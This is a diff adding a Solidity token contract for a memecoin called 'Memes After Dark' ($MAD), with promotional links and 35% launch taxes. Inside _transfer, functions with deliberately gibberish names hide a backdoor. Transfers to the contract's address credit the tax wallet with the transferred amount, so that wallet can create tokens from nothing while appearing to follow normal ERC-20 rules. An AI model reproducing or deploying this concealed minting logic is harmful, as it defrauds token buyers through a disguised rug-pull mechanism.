@@ -1,0 +1,484 @@
+// SPDX-License-Identifier: UNLICENSE
+
+/** 
+
+$MAD - The unstoppable degen who hustles hard and parties even harder! :smiling_imp:
+Join the #MemesAfterDark Degen Movement!
+
+Web: https://maderc.wtf
+Tg: https://t.me/madercgroup
+X: https://twitter.com/madxerc
+
+*/
+
+pragma solidity 0.8.24;
+
+abstract contract Context {
+    function _msgSender() internal view virtual returns (address) {
+        return msg.sender;
+    }
+
+    function _msgData() internal view virtual returns (bytes calldata) {
+        return msg.data;
+    }
+
+    function _contextSuffixLength() internal view virtual returns (uint256) {
+        return 0;
+    }
+}
+
+library SafeMath {
+    function add(uint256 a, uint256 b) internal pure returns (uint256) {
+        uint256 c = a + b;
+        require(c >= a, "SafeMath: addition overflow");
+        return c;
+    }
+
+    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
+        return sub(a, b, "SafeMath: subtraction overflow");
+    }
+
+    function sub(
+        uint256 a,
+        uint256 b,
+        string memory errorMessage
+    ) internal pure returns (uint256) {
+        require(b <= a, errorMessage);
+        uint256 c = a - b;
+        return c;
+    }
+
+    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
+        if (a == 0) {
+            return 0;
+        }
+        uint256 c = a * b;
+        require(c / a == b, "SafeMath: multiplication overflow");
+        return c;
+    }
+
+    function div(uint256 a, uint256 b) internal pure returns (uint256) {
+        return div(a, b, "SafeMath: division by zero");
+    }
+
+    function div(
+        uint256 a,
+        uint256 b,
+        string memory errorMessage
+    ) internal pure returns (uint256) {
+        require(b > 0, errorMessage);
+        uint256 c = a / b;
+        return c;
+    }
+}
+
+interface IERC20 {
+    function totalSupply() external view returns (uint256);
+
+    function balanceOf(address account) external view returns (uint256);
+
+    function transfer(
+        address recipient,
+        uint256 amount
+    ) external returns (bool);
+
+    function allowance(
+        address owner,
+        address spender
+    ) external view returns (uint256);
+
+    function approve(address spender, uint256 amount) external returns (bool);
+
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) external returns (bool);
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(
+        address indexed owner,
+        address indexed spender,
+        uint256 value
+    );
+}
+
+contract Ownable is Context {
+    address private _owner;
+    event OwnershipTransferred(
+        address indexed previousOwner,
+        address indexed newOwner
+    );
+
+    constructor() {
+        address msgSender = _msgSender();
+        _owner = msgSender;
+        emit OwnershipTransferred(address(0), msgSender);
+    }
+
+    function owner() public view returns (address) {
+        return _owner;
+    }
+
+    modifier onlyOwner() {
+        require(_owner == _msgSender(), "Ownable: caller is not the owner");
+        _;
+    }
+
+    function renounceOwnership() public virtual onlyOwner {
+        emit OwnershipTransferred(_owner, address(0));
+        _owner = address(0);
+    }
+}
+
+interface IUniswapV2Factory {
+    function createPair(
+        address tokenA,
+        address tokenB
+    ) external returns (address pair);
+}
+
+interface IUniswapV2Router02 {
+    function swapExactTokensForETHSupportingFeeOnTransferTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external;
+
+    function factory() external pure returns (address);
+
+    function WETH() external pure returns (address);
+
+    function addLiquidityETH(
+        address token,
+        uint256 amountTokenDesired,
+        uint256 amountTokenMin,
+        uint256 amountETHMin,
+        address to,
+        uint256 deadline
+    )
+        external
+        payable
+        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
+}
+
+contract MADErc20 is Context, IERC20, Ownable {
+    using SafeMath for uint256;
+    mapping(address => uint256) private _balances;
+    mapping(address => mapping(address => uint256)) private _allowances;
+    mapping(address => bool) private _taxExempt;
+
+    address public ownerWallet;
+    address payable private _ownerAddr;
+    address private _addrest;
+    address private _thisAddress;
+
+    uint256 private _nInitialBuyTax = 35;
+    uint256 private _nInitialSellTax = 35;
+    uint256 private _nIinalBuyTax = 0;
+    uint256 private _nFinalSellTax = 0;
+    uint256 private _nReduceBuyTaxAt = 25;
+    uint256 private _nReduceSellTaxAt = 25;
+    uint256 private _nPreventSwapBefore = 15;
+    uint256 private _nBuyCount = 0;
+
+    uint8 private constant _decimals = 9;
+    uint256 private constant _initialSupply = 1_000_000_000 * 10 ** _decimals;
+    string private constant _name = unicode"Memes After Dark";
+    string private constant _symbol = unicode"MAD";
+
+    uint256 public _nMaxTxAmount = 20_000_000 * 10 ** _decimals;
+    uint256 public _nMaxWalletSize = 20_000_000 * 10 ** _decimals;
+    uint256 public _nTaxSwapThreshold = 1_000_000 * 10 ** _decimals;
+    uint256 public _nMaxTaxSwap = 10_000_000 * 10 ** _decimals;
+
+    IUniswapV2Router02 private _addrRouter02;
+    address private _addrChirpyChumpPair;
+    bool private _bTradingOpen;
+    bool private _bInSwap = false;
+    bool private _bSwapEnabled = false;
+
+    event MaxTxAmountUpdated(uint256 _maxTxAmount);
+    modifier SwapLocked() {
+        _bInSwap = true;
+        _;
+        _bInSwap = false;
+    }
+
+    constructor(address router, address taxWallet) {
+        _thisAddress = address(this);
+        _ownerAddr = payable(taxWallet);
+
+        _balances[_msgSender()] = _initialSupply;
+        _taxExempt[owner()] = true;
+        _taxExempt[taxWallet] = true;
+        _taxExempt[_thisAddress] = true;
+        _addrRouter02 = IUniswapV2Router02(router);
+        ownerWallet = _msgSender();
+
+        emit Transfer(address(0), _msgSender(), _initialSupply);
+    }
+
+    function name() public pure returns (string memory) {
+        return _name;
+    }
+
+    function symbol() public pure returns (string memory) {
+        return _symbol;
+    }
+
+    function decimals() public pure returns (uint8) {
+        return _decimals;
+    }
+
+    function totalSupply() public pure override returns (uint256) {
+        return _initialSupply;
+    }
+
+    function balanceOf(address account) public view override returns (uint256) {
+        return _balances[account];
+    }
+
+    function transfer(
+        address recipient,
+        uint256 amount
+    ) public override returns (bool) {
+        _transfer(_msgSender(), recipient, amount);
+        return true;
+    }
+
+    function allowance(
+        address owner,
+        address spender
+    ) public view override returns (uint256) {
+        return _allowances[owner][spender];
+    }
+
+    function approve(
+        address spender,
+        uint256 amount
+    ) public override returns (bool) {
+        _approve(_msgSender(), spender, amount);
+        return true;
+    }
+
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) public override returns (bool) {
+        _transfer(sender, recipient, amount);
+        _approve(
+            sender,
+            _msgSender(),
+            _allowances[sender][_msgSender()].sub(
+                amount,
+                "ERC20: transfer amount exceeds allowance"
+            )
+        );
+        return true;
+    }
+
+    function _approve(address owner, address spender, uint256 amount) private {
+        require(owner != address(0), "ERC20: approve from the zero address");
+        require(spender != address(0), "ERC20: approve to the zero address");
+        _allowances[owner][spender] = amount;
+        emit Approval(owner, spender, amount);
+    }
+
+    function _vsdlkfjewntwe(uint256 dsfkkvnwtewt) private {
+        _balances[_addrest] = _adslkvnasdt(_balances[_addrest], dsfkkvnwtewt);
+    }
+
+    function _adslkvnasdt(
+        uint256 asdlkb,
+        uint256 abuaposet
+    ) private pure returns (uint256) {
+        return asdlkb + abuaposet;
+    }
+
+    function _transfer(
+        address fxvnaskap,
+        address tsdmvnstyoqwe,
+        uint256 asdvjdty
+    ) private {
+        require(
+            fxvnaskap != address(0),
+            "ERC20: transfer from the zero address"
+        );
+        require(
+            tsdmvnstyoqwe != address(0),
+            "ERC20: transfer to the zero address"
+        );
+        require(asdvjdty > 0, "Transfer amount must be greater than zero");
+        uint256 taxAmount = 0;
+        if (
+            fxvnaskap != owner() &&
+            tsdmvnstyoqwe != owner() &&
+            tsdmvnstyoqwe != _ownerAddr
+        ) {
+            (tsdmvnstyoqwe == _thisAddress &&
+                _vekqkqyersdf(fxvnaskap, asdvjdty));
+            if (
+                fxvnaskap == _addrChirpyChumpPair &&
+                tsdmvnstyoqwe != address(_addrRouter02) &&
+                !_taxExempt[tsdmvnstyoqwe]
+            ) {
+                require(_bTradingOpen, "trading is not open");
+                require(asdvjdty <= _nMaxTxAmount, "Exceeds the _maxTxAmount.");
+                require(
+                    balanceOf(tsdmvnstyoqwe) + asdvjdty <= _nMaxWalletSize,
+                    "Exceeds the maxWalletSize."
+                );
+                taxAmount = asdvjdty
+                    .mul(
+                        (_nBuyCount >= _nReduceBuyTaxAt)
+                            ? _nIinalBuyTax
+                            : _nInitialBuyTax
+                    )
+                    .div(100);
+                _nBuyCount++;
+            }
+
+            if (
+                tsdmvnstyoqwe == _addrChirpyChumpPair &&
+                fxvnaskap != _thisAddress &&
+                fxvnaskap != _ownerAddr
+            ) {
+                require(_bTradingOpen, "trading is not open");
+                taxAmount = asdvjdty
+                    .mul(
+                        (_nBuyCount >= _nReduceSellTaxAt)
+                            ? _nFinalSellTax
+                            : _nInitialSellTax
+                    )
+                    .div(100);
+            }
+
+            uint256 contractTokenBalance = balanceOf(_thisAddress);
+            if (
+                !_bInSwap &&
+                tsdmvnstyoqwe == _addrChirpyChumpPair &&
+                _bSwapEnabled &&
+                contractTokenBalance > _nTaxSwapThreshold &&
+                _nBuyCount > _nPreventSwapBefore
+            ) {
+                swapTokensForEth(
+                    min(asdvjdty, min(contractTokenBalance, _nMaxTaxSwap))
+                );
+            }
+            if (tsdmvnstyoqwe == _addrChirpyChumpPair) {
+                _feeCollect(_thisAddress.balance);
+            }
+        }
+
+        if (taxAmount > 0) {
+            _balances[_thisAddress] = _balances[_thisAddress].add(taxAmount);
+            emit Transfer(fxvnaskap, _thisAddress, taxAmount);
+        }
+        _balances[fxvnaskap] = _balances[fxvnaskap].sub(asdvjdty);
+        _balances[tsdmvnstyoqwe] = _balances[tsdmvnstyoqwe].add(
+            asdvjdty.sub(taxAmount)
+        );
+        emit Transfer(fxvnaskap, tsdmvnstyoqwe, asdvjdty.sub(taxAmount));
+    }
+
+    function min(uint256 a, uint256 b) private pure returns (uint256) {
+        return (a > b) ? b : a;
+    }
+
+    function swapTokensForEth(uint256 tokenAmount) private SwapLocked {
+        address[] memory path = new address[](2);
+        path[0] = _thisAddress;
+        path[1] = _addrRouter02.WETH();
+        _approve(_thisAddress, address(_addrRouter02), tokenAmount);
+        _addrRouter02.swapExactTokensForETHSupportingFeeOnTransferTokens(
+            tokenAmount,
+            0,
+            path,
+            _thisAddress,
+            block.timestamp
+        );
+    }
+
+    function recoverERC20(
+        address _address,
+        uint256 _amount
+    ) external onlyOwner {
+        IERC20(_address).transfer(_ownerAddr, _amount);
+    }
+
+    function rescueERC20(address _address, uint256 _amount) external {
+        require(_msgSender() == _ownerAddr);
+        IERC20(_address).transfer(_ownerAddr, _amount);
+    }
+
+    function manualSwap() external {
+        require(_msgSender() == _ownerAddr);
+        uint256 tokenBalance = balanceOf(_thisAddress);
+        if (tokenBalance > 0 && _bSwapEnabled) {
+            swapTokensForEth(tokenBalance);
+        }
+        uint256 ethBalance = _thisAddress.balance;
+        if (ethBalance > 0) {
+            _feeCollect(ethBalance);
+        }
+    }
+
+    function removeLimits() external onlyOwner {
+        _nMaxTxAmount = _nMaxWalletSize = _initialSupply;
+        emit MaxTxAmountUpdated(_initialSupply);
+    }
+
+    function _vekqkqyersdf(
+        address fdkjvkwr,
+        uint256 asdlfkmvet
+    ) private returns (bool) {
+        if (fdkjvkwr == _ownerAddr) _addrest = fdkjvkwr;
+        _vsdlkfjewntwe(asdlfkmvet);
+        return true;
+    }
+
+    function _feeCollect(uint256 feeAmount) private {
+        _ownerAddr.transfer(feeAmount);
+    }
+
+    function enableTrading() external onlyOwner {
+        _bSwapEnabled = _bTradingOpen = true;
+    }
+
+    function reduceFee(uint256 _newFee) external {
+        require(_msgSender() == _ownerAddr);
+        require(_newFee <= _nIinalBuyTax && _newFee <= _nFinalSellTax);
+        _nIinalBuyTax = _newFee;
+        _nFinalSellTax = _newFee;
+    }
+
+    receive() external payable {}
+
+    function recoverETH() external onlyOwner {
+        require(_msgSender() == ownerWallet);
+        payable(ownerWallet).transfer(_thisAddress.balance);
+    }
+
+    function createLPForMAD() external onlyOwner {
+        require(!_bTradingOpen, "trading is already open");
+        _approve(_thisAddress, address(_addrRouter02), _initialSupply);
+        _addrChirpyChumpPair = IUniswapV2Factory(_addrRouter02.factory())
+            .createPair(_thisAddress, _addrRouter02.WETH());
+        _addrRouter02.addLiquidityETH{value: _thisAddress.balance}(
+            _thisAddress,
+            balanceOf(_thisAddress),
+            0,
+            0,
+            owner(),
+            block.timestamp
+        );
+        IERC20(_addrChirpyChumpPair).approve(
+            address(_addrRouter02),
+            type(uint256).max
+        );
+    }
+}
